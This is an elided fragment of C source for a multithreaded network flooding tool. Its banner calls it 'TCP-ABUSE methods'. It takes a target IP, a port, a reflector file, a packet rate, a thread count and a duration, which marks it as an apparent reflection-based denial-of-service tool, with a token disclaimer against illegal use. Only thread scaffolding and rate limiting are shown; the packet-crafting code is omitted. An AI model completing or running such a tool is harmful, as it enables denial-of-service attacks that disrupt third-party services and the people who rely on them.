...
void *sender_thread(void *arg) {
    ...
    while (1) {
        ...
        for (int i = data->start_idx; i < data->end_idx; i++) {
            if (data->pps > 0) {
                if (count >= data->pps) {
                    struct timespec sleep_ts = {0, 1000000000L};
...
int main(int argc, char *argv[]) {
    if (argc != 7) {
        printf("TCP-ABUSE methods. Made By rajexploit404 - 2025.\n");
        printf("usage: %s <ip> <port> <reflector file> <pps -1 unlimited> <thread> <time>\n", argv[0]);
        printf("Don't Use for illegal activity\n");
        return 1;
    }
    ...
    for (int i = 0; i < num_threads; i++) {
        ...
        thread_data[i].pps = pps; // per thread 
